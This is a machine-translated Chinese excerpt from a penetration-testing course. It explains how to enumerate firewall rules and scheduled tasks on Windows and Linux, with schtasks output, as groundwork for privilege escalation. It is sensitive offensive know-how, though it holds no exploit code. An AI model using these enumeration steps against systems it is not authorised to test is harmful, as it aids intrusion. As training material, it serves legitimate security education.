<div style="position:absolute;top:96403;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="82"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 82 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:96436;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:97513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:97513;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:97513;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">523</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简介：    </font></font></nobr></div>
<div style="position:absolute;top:96532;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域，私人，公共</font></font></nobr></div>
<div style="position:absolute;top:96548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分组：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96548;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软照片</font></font></b></nobr></div>
<div style="position:absolute;top:96565;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地IP：    </font></font></b></nobr></div>
<div style="position:absolute;top:96565;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
<div style="position:absolute;top:96582;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程IP：    </font></font></b></nobr></div>
<div style="position:absolute;top:96582;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
<div style="position:absolute;top:96600;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议：    </font></font></b></nobr></div>
<div style="position:absolute;top:96600;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">边缘遍历：是</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96633;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行动：    </font></font></b></nobr></div>
<div style="position:absolute;top:96633;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规则名称：    </font></font></nobr></div>
<div style="position:absolute;top:96667;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@{Microsoft.Windows.Photos_2018.18022.15810.1000_x86__8wekyb3d8bbw</font></font></nobr></div>
<div style="position:absolute;top:96684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96701;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用：    </font></font></b></nobr></div>
<div style="position:absolute;top:96701;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></b></nobr></div>
<div style="position:absolute;top:96718;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方向：    </font></font></b></nobr></div>
<div style="position:absolute;top:96718;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出去</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简介：    </font></font></nobr></div>
<div style="position:absolute;top:96735;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域，私人，公共</font></font></nobr></div>
<div style="position:absolute;top:96752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分组：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96752;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软照片</font></font></b></nobr></div>
<div style="position:absolute;top:96769;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地IP：    </font></font></b></nobr></div>
<div style="position:absolute;top:96769;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
<div style="position:absolute;top:96786;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程IP：    </font></font></b></nobr></div>
<div style="position:absolute;top:96786;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
<div style="position:absolute;top:96803;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议：    </font></font></b></nobr></div>
<div style="position:absolute;top:96803;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">边缘遍历：否</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96837;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行动：    </font></font></b></nobr></div>
<div style="position:absolute;top:96837;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规则名称：    </font></font></nobr></div>
<div style="position:absolute;top:96871;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@{Microsoft.XboxIdentityProvider_12.39.13003.1000_x86__8wekyb3d8bb</font></font></nobr></div>
<div style="position:absolute;top:96888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- --------------------</font></font></nobr></div>
<div style="position:absolute;top:96905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:96924;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 531 - 列出 Windows 上的所有防火墙规则</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面列出的两个防火墙规则，Microsoft Photos 应用程序被允许</font></font></nobr></div>
<div style="position:absolute;top:96973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用任何协议建立进出任何 IP 地址的入站和出站连接。</font></font></nobr></div>
<div style="position:absolute;top:96992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，并非所有防火墙规则都有用，但某些配置可能会帮助我们扩展我们的</font></font></nobr></div>
<div style="position:absolute;top:97012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击面。</font></font></nobr></div>
<div style="position:absolute;top:97044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基于 Linux 的系统上，我们必须具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限才能使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出防火墙规则</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">463</font></font></font></nobr></div>
<div style="position:absolute;top:97064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，根据防火墙的配置方式，我们可能能够收集有关</font></font></nobr></div>
<div style="position:absolute;top:97083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为标准用户的规则。</font></font></nobr></div>
<div style="position:absolute;top:97116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，</font><font style="vertical-align: inherit;">Debian Linux 上</font><font style="vertical-align: inherit;">的 iptables-persistent </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包将防火墙规则保存在特定文件中</font></font></nobr></div>
<div style="position:absolute;top:97136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认在 /etc/iptables 目录下。</font><font style="vertical-align: inherit;">系统使用这些文件来恢复netfilter </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">465</font></font></font></nobr></div>
<div style="position:absolute;top:97155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动时的规则。</font><font style="vertical-align: inherit;">这些文件通常具有较弱的权限，允许他们读取</font></font></nobr></div>
<div style="position:absolute;top:97174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标系统上的任何本地用户。</font></font></nobr></div>
<div style="position:absolute;top:97207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以搜索</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables-save</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">创建的文件，该</font><font style="vertical-align: inherit;">命令用于转储</font></font></nobr></div>
<div style="position:absolute;top:97226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙配置到用户指定的文件中。</font><font style="vertical-align: inherit;">这个文件然后通常用作输入</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:97246;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables-restore</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，用于在启动时恢复防火墙规则。</font><font style="vertical-align: inherit;">如果一个系统</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员曾经运行过这个命令，我们可以搜索配置目录（/etc）或</font></font></nobr></div>
<div style="position:absolute;top:97284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep iptables 命令的文件系统来定位文件。</font><font style="vertical-align: inherit;">如果文件有不安全的权限，</font></font></nobr></div>
<div style="position:absolute;top:97304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用这些内容来推断系统上运行的防火墙配置规则。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:97423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">463 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Herve Eychenne，2003 年），https://linux.die.net/man/8/iptables</font></font></font></nobr></div>
<div style="position:absolute;top:97443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Debian，2019 年），https://packages.debian.org/search?keywords=iptables-persistent</font></font></font></nobr></div>
<div style="position:absolute;top:97463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">465 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Netfilter，2014 年），https://www.netfilter.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:97591;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="83"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 83 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:97624;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:98701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:98701;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:98701;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">524</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:97720;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.7 枚举计划任务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者通常在权限提升攻击中利用计划任务。</font></font></nobr></div>
<div style="position:absolute;top:97787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">充当服务器的系统通常会定期执行各种自动化的计划任务。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:97807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些服务器上的调度系统通常有一些令人困惑的语法，用于</font></font></nobr></div>
<div style="position:absolute;top:97826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行用户创建的可执行文件或脚本。</font><font style="vertical-align: inherit;">当这些系统配置错误时，或</font></font></nobr></div>
<div style="position:absolute;top:97845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户创建的文件具有不安全的权限，我们可以修改将要执行的这些文件</font></font></nobr></div>
<div style="position:absolute;top:97865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由高特权级别的调度系统执行。</font></font></nobr></div>
<div style="position:absolute;top:97897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">schtasks</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 466</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">在 Windows 上创建和查看计划任务</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/查询</font></font></font></b></nobr></div>
<div style="position:absolute;top:97917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数显示任务，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/FO LIST</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出格式设置为简单列表。</font><font style="vertical-align: inherit;">我们也可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/V</font></font></font></b></nobr></div>
<div style="position:absolute;top:97936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求详细输出。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">schtasks /query /fo LIST /v</font></font></font></b></nobr></div>
<div style="position:absolute;top:98005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件夹： \</font></font></nobr></div>
<div style="position:absolute;top:98022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息：目前在您的访问级别没有可用的计划任务。</font></font></nobr></div>
<div style="position:absolute;top:98056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件夹：\微软</font></font></nobr></div>
<div style="position:absolute;top:98073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息：目前在您的访问级别没有可用的计划任务。</font></font></nobr></div>
<div style="position:absolute;top:98107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件夹：\Microsoft\Office</font></font></nobr></div>
<div style="position:absolute;top:98124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名：    </font></font></nobr></div>
<div style="position:absolute;top:98124;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端251</font></font></nobr></div>
<div style="position:absolute;top:98141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务名称：    </font></font></nobr></div>
<div style="position:absolute;top:98141;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\Microsoft\Office\Office 15 订阅 Heartbe</font></font></nobr></div>
<div style="position:absolute;top:98158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:98175;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下次运行时间：    </font></font></b></nobr></div>
<div style="position:absolute;top:98175;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/12/2019 3:18:24 上午</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地位：    </font></font></nobr></div>
<div style="position:absolute;top:98191;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">准备好</font></font></nobr></div>
<div style="position:absolute;top:98209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录方式：    </font></font></nobr></div>
<div style="position:absolute;top:98209;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互动/背景</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:98226;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次运行时间：    </font></font></b></nobr></div>
<div style="position:absolute;top:98226;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/11/2019 3:49:25 上午</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后结果：    </font></font></nobr></div>
<div style="position:absolute;top:98243;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></nobr></div>
<div style="position:absolute;top:98260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：    </font></font></nobr></div>
<div style="position:absolute;top:98260;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软办公软件</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:98276;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要运行的任务：    </font></font></b></nobr></div>
<div style="position:absolute;top:98276;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%ProgramFiles%\Common Files\Microsoft Shared\Off</font></font></b></nobr></div>
<div style="position:absolute;top:98293;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ice16\OLicenseHeartbeat.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始于：    </font></font></nobr></div>
<div style="position:absolute;top:98310;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用</font></font></nobr></div>
<div style="position:absolute;top:98328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论：    </font></font></nobr></div>
<div style="position:absolute;top:98328;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于确保 Microsoft Office Su 的任务</font></font></nobr></div>
<div style="position:absolute;top:98344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bscription 许可是最新的。</font></font></nobr></div>
<div style="position:absolute;top:98361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划任务状态：    </font></font></nobr></div>
<div style="position:absolute;top:98361;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用</font></font></nobr></div>
<div style="position:absolute;top:98378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空闲时间：    </font></font></nobr></div>
<div style="position:absolute;top:98378;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:98395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能源管理：    </font></font></nobr></div>
<div style="position:absolute;top:98395;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止电池模式</font></font></nobr></div>
<div style="position:absolute;top:98412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以用户身份运行：    </font></font></nobr></div>
<div style="position:absolute;top:98412;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></nobr></div>
<div style="position:absolute;top:98429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果未重新安排，则删除任务：已禁用</font></font></nobr></div>
<div style="position:absolute;top:98446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止任务如果运行 X 小时 X 分钟：04:00:00</font></font></nobr></div>
<div style="position:absolute;top:98463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日程：    </font></font></nobr></div>
<div style="position:absolute;top:98463;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有这种格式的计划数据</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:98480;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日程类型：    </font></font></b></nobr></div>
<div style="position:absolute;top:98480;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日常的</font></font></b></nobr></div>
<div style="position:absolute;top:98497;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：    </font></font></b></nobr></div>
<div style="position:absolute;top:98497;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中午 12:00:00</font></font></b></nobr></div>
<div style="position:absolute;top:98514;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始日期：    </font></font></b></nobr></div>
<div style="position:absolute;top:98514;left:417"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1/1/2010</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束日期：    </font></font></nobr></div>
<div style="position:absolute;top:98531;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用</font></font></nobr></div>
<div style="position:absolute;top:98548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">天：    </font></font></nobr></div>
<div style="position:absolute;top:98548;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每 1 天</font></font></nobr></div>
<div style="position:absolute;top:98565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">月份：    </font></font></nobr></div>
<div style="position:absolute;top:98565;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用</font></font></nobr></div>
<div style="position:absolute;top:98582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重复： 每个：    </font></font></nobr></div>
<div style="position:absolute;top:98582;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:98599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重复： 直到： 时间：    </font></font></nobr></div>
<div style="position:absolute;top:98599;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:98651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">466 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:98779;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="84"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 84 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:98812;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:99889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:99889;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:99889;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">525</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重复： 直到： 持续时间：    </font></font></nobr></div>
<div style="position:absolute;top:98908;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:98924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重复：如果仍在运行则停止：    </font></font></nobr></div>
<div style="position:absolute;top:98924;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:98941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:98961;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 532 - 列出 Windows 上的所有计划任务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98990;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">schtasks</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的输出</font><font style="vertical-align: inherit;">包括许多有用的信息，例如要运行的任务、</font></font></nobr></div>
<div style="position:absolute;top:99010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下次运行的时间、上次运行的时间以及运行频率的详细信息。</font></font></nobr></div>
<div style="position:absolute;top:99042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Linux 的作业调度程序称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cron</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">467</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划任务列在 /etc/cron.* 下</font></font></nobr></div>
